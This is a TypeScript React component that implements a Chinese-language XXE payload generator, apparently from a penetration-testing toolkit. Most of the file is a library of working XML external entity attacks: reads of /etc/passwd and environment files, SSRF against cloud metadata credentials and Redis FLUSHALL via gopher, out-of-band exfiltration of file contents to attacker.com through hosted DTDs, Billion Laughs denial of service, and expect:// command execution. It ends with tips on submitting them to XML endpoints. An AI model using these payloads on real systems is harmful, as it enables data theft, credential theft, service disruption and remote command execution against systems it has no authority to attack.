import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const SCENARIO_OPTIONS = [
  { value: 'file-read', label: '文件读取' },
  { value: 'ssrf', label: 'SSRF' },
  { value: 'blind-oob', label: 'Blind OOB' },
  { value: 'dos', label: 'DoS' },
  { value: 'expect-rce', label: 'Expect RCE' },
];

const PARSER_OPTIONS = [
  { value: 'libxml2', label: 'libxml2' },
  { value: 'xerces', label: 'Xerces' },
  { value: '.net', label: '.NET' },
  { value: 'php', label: 'PHP' },
];

const PAYLOADS: Record<string, string[]> = {
  'file-read': [
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///proc/self/environ">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///dev/random">\n]>\n<foo>&xxe;</foo>',
  ],
  ssrf: [
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "http://127.0.0.1/">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_FLUSHALL%0aSET%20foo%20bar%0aSAVE">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "dict://127.0.0.1:11211/stats">\n]>\n<foo>&xxe;</foo>',
  ],
  'blind-oob': [
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">\n%dtd;\n]>\n<foo>&send;</foo>\n\n--- evil.dtd (托管在attacker.com) ---\n<!ENTITY % all "<!ENTITY send SYSTEM \'http://attacker.com/?data=%file;\'>">\n%all;',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?d=%file;\'>">\n%eval;\n%exfil;\n]>\n<foo>test</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">\n<!ENTITY % dtd SYSTEM "http://attacker.com/payload.dtd">\n%dtd;\n]>\n<foo>&send;</foo>\n\n--- payload.dtd ---\n<!ENTITY % all "<!ENTITY send SYSTEM \'ftp://attacker.com/%file;\'>">\n%all;',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">\n<!ENTITY % ext SYSTEM "http://attacker.com/x.dtd">\n%ext;\n]>\n<r>&exfil;</r>\n\n--- x.dtd ---\n<!ENTITY % all "<!ENTITY exfil SYSTEM \'http://attacker.com/collect.php?d=%file;\'>">\n%all;',
  ],
  dos: [
    '<?xml version="1.0"?>\n<!DOCTYPE lolz [\n<!ENTITY lol "lol">\n<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n]>\n<lolz>&lol6;</lolz>\n\n(十亿笑声攻击 Billion Laughs)',
    '<?xml version="1.0"?>\n<!DOCTYPE bomb [\n<!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">\n<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">\n<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">\n]>\n<bomb>&e;</bomb>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///dev/random">\n]>\n<foo>&xxe;</foo>\n\n(读取/dev/random导致挂起)',
  ],
  'expect-rce': [
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "expect://id">\n]>\n<foo>&xxe;</foo>\n\n(PHP expect:// 协议执行命令)',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "expect://cat${IFS}/etc/passwd">\n]>\n<foo>&xxe;</foo>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "expect://whoami">\n]>\n<foo>&xxe;</foo>',
  ],
};

const PARSER_NOTES: Record<string, string> = {
  libxml2: 'libxml2 (PHP/Python/默认): 默认可能禁用外部实体 (LIBXML_NOENT)。检查 libxml_disable_entity_loader()。PHP 8.0+ 默认禁用。',
  xerces: 'Xerces (Java): 需设置 FEATURE_SECURE_PROCESSING。JDK 默认禁用外部 DTD，但旧版本可能未禁用。',
  '.net': '.NET: XmlDocument 默认解析外部实体。需设置 XmlResolver = null。XmlReader 默认安全。',
  php: 'PHP: simplexml_load_string 默认不解析外部实体（除非 LIBXML_NOENT）。DOMDocument 需检查配置。',
};

const generate = (scenario: string, parser: string): string => {
  const payloads = PAYLOADS[scenario] ?? PAYLOADS['file-read'];
  return [
    `=== XXE Payload（Scenario: ${scenario} / Parser: ${parser}）===`,
    '',
    '--- Payload 列表 ---',
    ...payloads.map((p, i) => `[${i + 1}]\n${p}`).join('\n\n').split('\n'),
    '',
    '--- 解析器说明 ---',
    PARSER_NOTES[parser] ?? PARSER_NOTES.libxml2,
    '',
    '--- 测试提示 ---',
    '1. 将 XML 提交到接收 XML 输入的接口 (Content-Type: application/xml / text/xml)',
    '2. Blind OOB 需在 attacker.com 托管 DTD 文件',
    '3. SSRF 可探测内网服务和云元数据 (169.254.169.254)',
    '4. 文件读取可尝试 /etc/passwd, /proc/self/environ, web.config 等',
  ].join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="XXE Payload生成器"
    paramsConfig={[
      { name: 'scenario', label: '场景', type: 'select', options: SCENARIO_OPTIONS, default: 'file-read' },
      { name: 'parser', label: '解析器', type: 'select', options: PARSER_OPTIONS, default: 'libxml2' },
    ]}
    execute={(
      _input: string,
      _mode: string,
      params: Record<string, unknown>,
    ): string => generate(
      (params.scenario as string) ?? 'file-read',
      (params.parser as string) ?? 'libxml2',
    )}
  />
);

export default ToolComponent;
